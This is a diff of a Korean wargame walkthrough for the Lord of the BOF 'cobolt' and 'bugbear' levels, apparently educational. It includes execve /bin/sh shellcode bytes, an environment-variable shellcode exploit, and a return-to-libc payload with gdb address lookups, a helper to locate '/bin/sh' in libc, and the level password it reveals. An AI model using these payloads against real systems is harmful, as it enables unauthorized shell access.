@@ -1,40 +1,48 @@
 ============================================================================================================
-[redhat-lob] (2) cobolt
+[redhat-lob] (13) bugbear
 ============================================================================================================
-
 
 .. graphviz::
 
     digraph foo {
         a -> b -> c -> d -> e;
 
-        a [shape=box, label="dummy * 20 + envp address"];
+        a [shape=box, label="dummy*44 + &system() + dummy*4 + &(/bin/sh)"];
         b [shape=box, color=lightblue, label="strcpy"];
         c [shape=box, label="Buffer Overflow"];
-        d [shape=box, label="envp address"];
-        e [shape=box, label="dummy * 100 + shellcode"];
+        e [shape=box, label="libc"];
     }
-
 
 |
 
-Source Code
+source code
 ============================================================================================================
 
 .. code-block:: c
 
-    int main(int argc, char *argv[])
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    main(int argc, char *argv[])
     {
-        char buffer[16];
+        char buffer[40];
+        int i;
+
         if(argc < 2){
             printf("argv error\n");
             exit(0);
         }
+
+        if(argv[1][47] == '\xbf')
+        {
+            printf("stack betrayed you!!\n");
+            exit(0);
+        }
+
         strcpy(buffer, argv[1]);
         printf("%s\n", buffer);
     }
 
-|
 
 
 Vulnerabliity Vector
@@ -70,89 +78,75 @@ main 함수의 ret를 덮어씌워 오버플로우를 발생시킨다.
 
 |
 
-
-Buffer Overflow
+Segmentation fault
 ============================================================================================================
 
+Overflow condition 
+
+- argv[1]의 47번째 문자열이 "\\xbf"이어야 함
 
 .. code-block:: console
 
     ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
     $ bash2
-    $ ./cobolt `python -c "print 'a'*16"`
+    $ ./bugbear `python -c 'print "a"*40'`
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
-    aaaaaaaaaaaaaaaa
-
-    $ ./cobolt `python -c "print 'a'*20"`
-
-    aaaaaaaaaaaaaaaaaaaa
-
+    $ ./bugbear `python -c 'print "a"*44'`
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
     Segmentation fault
 
-|
+
 
 exploit
 ============================================================================================================
 
-환경 변수 상에 쉘코드 등록
-------------------------------------------------------------------------------------------------------------
-
-환경 변수에 쉘코드를 등록해두고, 입력값 마지막 리턴 주소를 환경 변수 주소로 변경하여 해당 쉘코드를 실행하도록 한다.
+gdb를 통해 system()함수 주소를 확인하고, "/bin/sh" 문자열 위치 주소를 확인한다.
 
 .. code-block:: console
 
-    $ export shellcode=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+    (gdb) p system
+    $1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
 
-|
-
-환경 변수 주소값 확인
-------------------------------------------------------------------------------------------------------------
-
-다음과 같이 소스코드를 작성하여 shellcode 환경 변수에 대한 주소 값을 획득.
 
 .. code-block:: c
 
     #include <stdio.h>
-    int main(int argc, char **argv)
-    {
-            char *addr;
-            addr = getenv(argv[1]);
-            printf("address %p\n", addr);
-            return 0;
+    main(){
+        long shell=0x40058ae0;
+        while(memcmp((void*)shell, "/bin/sh", 8))
+        shell++;
+        printf("%x\n",shell);
     }
-
+ 
 .. code-block:: console
 
-    $ gcc -o get get.c
+    $ ./findsh
+    400fbff9
 
-    get.c: In function `main':
-    get.c:5: warning: assignment makes pointer from integer without a cast
-
-    $ ./get shellcode
-
-    address 0xbfffff01
 
 |
 
-환경 변수 주소 쉘코드 실행
+libc를 이용한 쉘코드 실행
 ------------------------------------------------------------------------------------------------------------
 
 .. code-block:: console
 
+    libc ->> shellcode
     ==============================
     LOW     
     ------------------------------
-    local variables of main
-    saved registers of main
-    return address of main <<- overflow
+    local variables of problem_child
+    saved registers of problem_child
+    return address of problem_child <<- overflow
     argc
     argv
     envp
     stack from startup code
     argc
-    argv pointers
+    argv pointers ->> shellcode
     NULL that ends argv[]
-    environment pointers ->> shellcode
+    environment pointers
     NULL that ends envp[]
     ELF Auxiliary Table
     argv strings
@@ -160,22 +154,23 @@ exploit
     program name
     NULL
     ------------------------------
-    HIGH (0xC0000000)    
+    HIGH (0xC0000000)
     ==============================
 
 |
 
-오버플로우시 RET를 환경 변수 주소로 덮어씌워 해당 쉘코드가 실행되도록 한다.
+
 
 .. code-block:: console
 
-    $ ./cobolt `python -c 'print "\x90"*20+"\x01\xff\xff\xbf"'`
+    $ ./bugbear `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"'`
+
 
     bash$ whoami
-    cobolt
+    bugbear
     bash$ my-pass
-    euid = 502
-    hacking exposed
+    euid = 513
+    new divide
 
 
 
